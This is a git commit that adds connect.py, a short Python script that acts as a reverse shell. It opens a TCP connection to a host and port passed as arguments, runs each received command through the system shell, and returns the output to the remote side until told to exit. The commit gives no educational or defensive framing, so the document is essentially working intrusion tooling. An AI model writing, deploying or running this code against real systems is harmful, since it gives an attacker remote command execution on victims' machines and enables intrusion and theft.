0cc9fe94383e3b4457197cc7ed3ffe7cef5f821d
owen51251 <30658163+owen51251@users.noreply.github.com>
2018-07-12 14:37:09 +0800

    Add files via upload

---
+++ connect.py
@@ -0,0 +1,28 @@
+#!/usr/bin/env python
+import socket,subprocess as sp,sys
+
+host = str(sys.argv[1])
+port = int(sys.argv[2])
+
+conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+conn.connect((host,port))
+
+while 1:
+    command = str(conn.recv(1024).decode('utf-8'))
+
+    if command != "exit()":
+        sh = sp.Popen(command,shell=True,
+                stdout=sp.PIPE,
+                stderr=sp.PIPE,
+                stdin=sp.PIPE)
+
+        out , err = sh.communicate()
+
+        result = str(out) + str(err)
+
+        length = str(len(result)).zfill(16)
+
+        conn.send((length + result).encode('utf-8'))
+    else:break
+conn.close()
+        
